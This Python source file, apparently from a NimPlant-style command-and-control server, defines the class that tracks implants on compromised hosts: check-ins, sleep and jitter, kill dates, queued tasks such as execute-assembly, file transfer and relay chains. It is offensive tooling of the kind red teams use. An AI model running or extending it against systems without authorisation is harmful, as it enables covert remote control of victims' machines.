# Class to contain data and status about connected implant
import itertools
import json
import os
import random
import string
from datetime import datetime
from secrets import choice
from typing import List

import src.config.db as db
import src.util.time as time
from src.config.config import config
import src.util.utils as utils

initialSleepTime = config["implant"]["sleepTime"]
initialSleepJitter = config["implant"]["sleepJitter"]
killDate = config["implant"]["killDate"]

class NimPlant:
    newId = itertools.count(start=1)

    def __init__(self):
        self.id = str(next(self.newId))
        self.guid = "".join(
            random.choice(string.ascii_letters + string.digits) for i in range(8)
        )
        self.active = False
        self.late = False
        self.ip_external = None
        self.ip_internal = None
        self.username = None
        self.hostname = None
        self.os_build = None
        self.pid = None
        self.pname = None
        self.risky_mode = None
        self.sleep_time = initialSleepTime
        self.sleep_jitter = initialSleepJitter
        self.kill_date = killDate
        self.first_checkin = None
        self.last_checkin = None
        self.pending_tasks: List[str] = []
        self.hosting_file = None
        self.receiving_file = None
        self.checkin_count = 0
        self.workspace_uuid = ""

        # Relay topology information
        self.is_relay_server = False
        self.relay_server_port = None
        self.upstream_relay_host = None
        self.upstream_relay_port = None
        self.relay_chain = []  # List of relay nodes in the chain to C2
        self.downstream_clients = []  # List of downstream relay clients
        self.relay_topology_updated = None

        # Generate random, 16-char key for crypto operations
        self.encryption_key = "".join(
            choice(string.ascii_letters + string.digits) for x in range(16)
        )

    def activate(
        self,
        ip_external,
        ip_internal,
        username,
        hostname,
        os_build,
        pid,
        pname,
        risky_mode,
        relay_role="STANDARD",
    ):
        self.active = True
        self.ip_external = ip_external
        self.ip_internal = ip_internal
        self.username = username
        self.hostname = hostname
        self.os_build = os_build
        self.pid = pid
        self.pname = pname
        self.risky_mode = risky_mode
        self.relay_role = relay_role
        self.first_checkin = time.timestamp()
        self.last_checkin = time.timestamp()

        utils.nimplant_print(
            f"Implant #{self.id} ({self.guid}) checked in from {username}@{hostname} at '{ip_external}'!\n"
            f"OS version is {os_build}."
        )

        if self.workspace_uuid:
            utils.nimplant_print(f"Implant belongs to workspace: {self.workspace_uuid}")

        # Create new Implant object in the database
        from src.servers.admin_api.models.nimplant_listener_model import np_server
        db.db_initialize_nimplant(self, np_server.guid)

    def restore_from_database(self, db_nimplant):
        self.id = db_nimplant["id"]
        self.guid = db_nimplant["guid"]
        self.active = db_nimplant["active"]
        self.late = db_nimplant["late"]
        self.ip_external = db_nimplant["ipAddrExt"]
        self.ip_internal = db_nimplant["ipAddrInt"]
        self.username = db_nimplant["username"]
        self.hostname = db_nimplant["hostname"]
        self.os_build = db_nimplant["osBuild"]
        self.pid = db_nimplant["pid"]
        self.pname = db_nimplant["pname"]
        self.risky_mode = db_nimplant["riskyMode"]
        self.sleep_time = db_nimplant["sleepTime"]
        self.sleep_jitter = db_nimplant["sleepJitter"]
        self.kill_date = db_nimplant["killDate"]
        self.first_checkin = db_nimplant["firstCheckin"]
        self.last_checkin = db_nimplant["lastCheckin"]
        self.hosting_file = db_nimplant["hostingFile"]
        self.receiving_file = db_nimplant["receivingFile"]
        self.encryption_key = db_nimplant["UNIQUE_XOR_KEY"]
        
        try:
            self.workspace_uuid = db_nimplant["workspace_uuid"] if db_nimplant["workspace_uuid"] else ""
        except (KeyError, IndexError):
            self.workspace_uuid = ""
        
        try:
            self.relay_role = db_nimplant["relay_role"] if db_nimplant["relay_role"] else "STANDARD"
        except (KeyError, IndexError):
            self.relay_role = "STANDARD"
        
        try:
            self.checkin_count = db_nimplant["checkin_count"]
        except (KeyError, IndexError):
            self.checkin_count = 0

        # Restore relay topology information
        try:
            # Use dict() to convert Row to dictionary or handle missing columns
            try:
                self.is_relay_server = db_nimplant["is_relay_server"] if "is_relay_server" in db_nimplant.keys() else False
            except (KeyError, IndexError):
                self.is_relay_server = False
                
            try:
                self.relay_server_port = db_nimplant["relay_server_port"] if "relay_server_port" in db_nimplant.keys() else None
            except (KeyError, IndexError):
                self.relay_server_port = None
                
            try:
                self.upstream_relay_host = db_nimplant["upstream_relay_host"] if "upstream_relay_host" in db_nimplant.keys() else None
            except (KeyError, IndexError):
                self.upstream_relay_host = None
                
            try:
                self.upstream_relay_port = db_nimplant["upstream_relay_port"] if "upstream_relay_port" in db_nimplant.keys() else None
            except (KeyError, IndexError):
                self.upstream_relay_port = None
            
            # Parse JSON fields for relay topology
            try:
                relay_chain_json = db_nimplant["relay_chain"] if "relay_chain" in db_nimplant.keys() else None
                self.relay_chain = json.loads(relay_chain_json) if relay_chain_json else []
            except (KeyError, IndexError, json.JSONDecodeError):
                self.relay_chain = []
            
            try:
                downstream_clients_json = db_nimplant["downstream_clients"] if "downstream_clients" in db_nimplant.keys() else None
                self.downstream_clients = json.loads(downstream_clients_json) if downstream_clients_json else []
            except (KeyError, IndexError, json.JSONDecodeError):
                self.downstream_clients = []
            
            try:
                self.relay_topology_updated = db_nimplant["relay_topology_updated"] if "relay_topology_updated" in db_nimplant.keys() else None
            except (KeyError, IndexError):
                self.relay_topology_updated = None
                
        except Exception as e:
            # Initialize with defaults if any error occurs
            self.is_relay_server = False
            self.relay_server_port = None
            self.upstream_relay_host = None
            self.upstream_relay_port = None
            self.relay_chain = []
            self.downstream_clients = []
            self.relay_topology_updated = None

    def checkin(self):
        self.last_checkin = time.timestamp()
        self.late = False
        # Increment the check-in counter each time the implant checks in
        self.checkin_count += 1
        utils.nimplant_print(f"Implant #{self.id} checked in. Total check-ins: {self.checkin_count}")
        
        if self.pending_tasks:
            for t in self.pending_tasks:
                task = json.loads(t)
                if task.get("command") == "kill":
                    self.active = False
                    utils.nimplant_print(
                        f"Implant #{self.id} killed.",
                        self.guid,
                        task_guid=task.get("guid"),
                    )

        db.db_update_nimplant(self)

    def get_last_checkin_seconds(self):
        if self.last_checkin is None:
            return None
        last_checkin_datetime = datetime.strptime(
            self.last_checkin, time.TIMESTAMP_FORMAT
        )
        now_datetime = datetime.now()
        return (now_datetime - last_checkin_datetime).seconds

    def is_active(self):
        if not self.active:
            return False
        return self.active

    def is_late(self):
        # Check if the check-in is taking longer than the maximum expected time (with a 10s margin)
        if not self.active:
            return False

        if self.get_last_checkin_seconds() > (
            self.sleep_time + (self.sleep_time * (self.sleep_jitter / 100)) + 10
        ):
            if self.late:
                return True

            self.late = True
            utils.nimplant_print("Implant is late...", self.guid)
            db.db_update_nimplant(self)
            return True
        else:
            self.late = False
            return False

    def kill(self):
        self.add_task(["kill"])

    def get_info_pretty(self):
        return utils.pretty_print(vars(self))

    def get_next_task(self):
        if not self.pending_tasks or len(self.pending_tasks) == 0:
            utils.nimplant_print(f"DEBUG: No pending tasks for implant {self.guid}")
            return None
            
        try:
            utils.nimplant_print(f"DEBUG: Getting next task from {len(self.pending_tasks)} pending tasks")
            task = self.pending_tasks[0]
            utils.nimplant_print(f"DEBUG: Next task: {task}")
            
            # Remove the task from the pending tasks list
            self.pending_tasks.pop(0)
            utils.nimplant_print(f"DEBUG: Removed task from pending list. Remaining tasks: {len(self.pending_tasks)}")
            
            # Ensure that changes are reflected in the database
            db.db_update_nimplant(self)
            utils.nimplant_print(f"DEBUG: Updated implant in database")
            
            return task
        except Exception as e:
            utils.nimplant_print(f"ERROR in get_next_task: {str(e)}")
            import traceback
            utils.nimplant_print(f"DEBUG: Traceback: {traceback.format_exc()}")
            # In case of error, we try to return the first task without removing it
            if self.pending_tasks and len(self.pending_tasks) > 0:
                return self.pending_tasks[0]
            return None

    def add_task(self, task, task_friendly=None):
        # Log the 'friendly' command separately, for use with B64-driven commands such as inline-execute
        if task_friendly is None:
            task_friendly = " ".join(task)

        command = task[0]
        args = task[1:] if len(task) > 1 else []
        task_str = " ".join(task)
        
        # Special processing for execute-assembly to ensure hash is preserved in database
        if command == "execute-assembly" and len(args) >= 3:
            # If we are processing an execute-assembly command, we use the task_str (which contains the
            # correct hash) as task_friendly also to avoid that the hash is replaced by the
            # base64 content in the database
            utils.nimplant_print(f"DEBUG: execute-assembly command detected, ensuring hash is preserved")
            utils.nimplant_print(f"DEBUG: Original task_friendly: {task_friendly}")
            task_friendly = task_str
            utils.nimplant_print(f"DEBUG: Modified task_friendly: {task_friendly}")
        
        # Special logging for kill command
        if command == "kill":
            utils.nimplant_print(f"DEBUG: Adding KILL command to pending tasks")

        guid = "".join(
            random.choice(string.ascii_letters + string.digits) for i in range(8)
        )
        
        # Create task as JSON
        task_json = json.dumps({"guid": guid, "command": command, "args": args})
        utils.nimplant_print(f"DEBUG: Task created: {task_json}")
        
        # Add to the pending tasks list
        self.pending_tasks.append(task_json)
        utils.nimplant_print(f"DEBUG: Pending tasks after adding: {self.pending_tasks}")
        
        # Register in the database log
        db.db_nimplant_log(self, task_guid=guid, task=task_str, task_friendly=task_friendly)
        utils.nimplant_print(f"DEBUG: Task registered in database log")
        
        # Ensure that changes are reflected in the database
        db.db_update_nimplant(self)
        utils.nimplant_print(f"DEBUG: NimPlant object updated in database")
        
        # For the kill command, explicitly verify if it was saved
        if command == "kill":
            try:
                # Verify that it was saved in the database
                from src.config.db import con
                saved_tasks = con.execute(
                    "SELECT pendingTasks FROM nimplant WHERE guid = ?", (self.guid,)
                ).fetchone()
                
                if saved_tasks and saved_tasks[0]:
                    utils.nimplant_print(f"DEBUG: Successful verification - Tasks in DB: {saved_tasks[0]}")
                else:
                    utils.nimplant_print(f"DEBUG: WARNING - No tasks found in the database")
                    # Try updating again
                    db.db_update_nimplant(self)
            except Exception as e:
                utils.nimplant_print(f"DEBUG: Error verifying tasks in DB: {str(e)}")
                import traceback
                utils.nimplant_print(f"DEBUG: Traceback: {traceback.format_exc()}")
        
        return guid

    def set_task_result(self, task_guid, result):
        if result == "NIMPLANT_KILL_TIMER_EXPIRED":
            # Process Implant self destruct
            self.active = False
            utils.nimplant_print(
                "Implant announced self-destruct (kill date passed). RIP.", self.guid
            )
        else:
            # Parse new sleep time if changed
            if result.startswith("Sleep time changed"):
                rsplit = result.split(" ")
                self.sleep_time = int(rsplit[4])
                self.sleep_jitter = int(rsplit[6].split("%")[0][1:])

            # Process result
            utils.nimplant_print(result, self.guid, task_guid=task_guid)
            db.db_nimplant_log(self, task_guid=task_guid, result=result)
            
        db.db_update_nimplant(self)

    def cancel_all_tasks(self):
        self.pending_tasks = []
        db.db_update_nimplant(self)

    def host_file(self, file):
        self.hosting_file = file
        db.db_update_nimplant(self)

    def stop_hosting_file(self):
        self.hosting_file = None
        db.db_update_nimplant(self)

    def receive_file(self, file):
        self.receiving_file = file
        db.db_update_nimplant(self)

    def stop_receiving_file(self):
        self.receiving_file = None
        db.db_update_nimplant(self)

    def update_relay_topology(self, is_relay_server=None, relay_server_port=None, 
                             upstream_relay_host=None, upstream_relay_port=None, 
                             relay_chain=None, downstream_clients=None):
        """Update relay topology information for this implant"""
        if is_relay_server is not None:
            self.is_relay_server = is_relay_server
        if relay_server_port is not None:
            self.relay_server_port = relay_server_port
        if upstream_relay_host is not None:
            self.upstream_relay_host = upstream_relay_host
        if upstream_relay_port is not None:
            self.upstream_relay_port = upstream_relay_port
        if relay_chain is not None:
            self.relay_chain = relay_chain
        if downstream_clients is not None:
            self.downstream_clients = downstream_clients
        
        self.relay_topology_updated = time.timestamp()
        db.db_update_nimplant(self)
        
        utils.nimplant_print(f"Updated relay topology for implant {self.guid}")

    def get_relay_info(self):
        """Get relay topology information as a dictionary"""
        return {
            "guid": self.guid,
            "is_relay_server": self.is_relay_server,
            "relay_server_port": self.relay_server_port,
            "upstream_relay_host": self.upstream_relay_host,
            "upstream_relay_port": self.upstream_relay_port,
            "relay_chain": self.relay_chain,
            "downstream_clients": self.downstream_clients,
            "relay_topology_updated": self.relay_topology_updated,
            "hostname": self.hostname,
            "ip_external": self.ip_external,
            "ip_internal": self.ip_internal,
            "active": self.active
        }

    def is_relay_node(self):
        """Check if this implant is part of a relay chain"""
        return self.is_relay_server or self.upstream_relay_host is not None
